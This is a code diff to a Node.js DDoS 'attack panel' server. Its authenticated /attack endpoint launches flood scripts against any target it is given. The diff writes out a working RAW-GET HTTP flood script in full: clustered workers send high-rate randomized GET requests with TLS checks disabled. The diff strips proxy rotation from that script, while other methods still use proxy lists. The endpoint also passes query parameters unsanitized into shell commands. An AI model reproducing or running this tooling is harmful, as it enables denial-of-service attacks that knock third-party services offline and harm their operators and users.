@@ -131,7 +131,7 @@ const methodFiles = {
   'RAPID10': 'methods/r10-rapid.js'
 };
 
-// Ensure methods directory exists and create raw-get.js if missing
+// Ensure methods directory exists and create raw-get.js WITHOUT proxies
 function ensureMethodScripts() {
   if (!fs.existsSync('./methods')) fs.mkdirSync('./methods');
   
@@ -139,20 +139,18 @@ function ensureMethodScripts() {
   if (!fs.existsSync(rawGetPath)) {
     const rawGetScript = `#!/usr/bin/env node
 
-// RAW-GET Flood - Pure GET requests, high RPS, minimal headers
+// RAW-GET Flood - Pure GET requests, high RPS, minimal headers (NO PROXIES)
 
 const http = require('http');
 const https = require('https');
 const url = require('url');
-const fs = require('fs');
 const cluster = require('cluster');
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]) || 60,
     threads: parseInt(process.argv[4]) || 10,
-    rate: parseInt(process.argv[5]) || 1000,
-    proxyFile: process.argv[6] || 'proxy.txt'
+    rate: parseInt(process.argv[5]) || 1000
 };
 
 const parsed = new URL(args.target);
@@ -166,17 +164,8 @@ const keepAliveAgent = new httpLib.Agent({
     timeout: 60000
 });
 
-let proxies = [];
-if (fs.existsSync(args.proxyFile)) {
-    proxies = fs.readFileSync(args.proxyFile, 'utf8')
-        .split('\\n')
-        .map(l => l.trim())
-        .filter(l => l && !l.startsWith('#') && l.includes(':'));
-}
-let proxyIndex = 0;
-
 if (cluster.isMaster) {
-    console.log(\`\\n🔥 RAW-GET flood | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
+    console.log(\`\\n🔥 RAW-GET (no proxy) | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
     for (let i = 0; i < args.threads; i++) cluster.fork();
     setTimeout(() => process.exit(0), args.time * 1000 + 2000);
 } else {
@@ -185,7 +174,7 @@ if (cluster.isMaster) {
 
     function sendRequest() {
         if (!running) return;
-        let options = {
+        const options = {
             hostname: parsed.hostname,
             port: parsed.port || (isHttps ? 443 : 80),
             path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
@@ -198,12 +187,6 @@ if (cluster.isMaster) {
             agent: keepAliveAgent,
             rejectUnauthorized: false
         };
-        if (proxies.length > 0) {
-            const proxy = proxies[proxyIndex % proxies.length];
-            proxyIndex++;
-            const [proxyHost, proxyPort] = proxy.split(':');
-            options.agent = new httpLib.Agent({ host: proxyHost, port: parseInt(proxyPort), keepAlive: true });
-        }
         const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
         req.on('error', () => {});
         req.end();
@@ -223,7 +206,7 @@ if (cluster.isMaster) {
 }
 `;
     fs.writeFileSync(rawGetPath, rawGetScript);
-    console.log('[SETUP] Created methods/raw-get.js');
+    console.log('[SETUP] Created methods/raw-get.js (no proxy)');
   }
 }
 
@@ -373,7 +356,7 @@ app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(b
 
 app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));
 
-// Server-side attack endpoint
+// Server-side attack endpoint (RAW-GET now without proxy)
 app.get('/attack', authenticate, (req, res) => {
   const { target, time, methods } = req.query;
   if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });
@@ -422,7 +405,8 @@ app.get('/attack', authenticate, (req, res) => {
       execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
       break;
     case 'RAW-GET':
-      execWithLog(`node methods/raw-get.js ${target} ${timeNum} 20 800 proxy.txt`);
+      // No proxy argument – script ignores proxy.txt
+      execWithLog(`node methods/raw-get.js ${target} ${timeNum} 20 800`);
       break;
     case 'R9':
       execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt`);
@@ -493,7 +477,7 @@ app.listen(port, () => {
   console.log(`📍 Listening on port ${port}`);
   console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
   console.log(`📊 Live Stats: ENABLED`);
-  console.log(`🔥 RAW-GET method ready`);
+  console.log(`🔥 RAW-GET method ready (no proxy required)`);
   console.log('========================================\n');
   
   if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
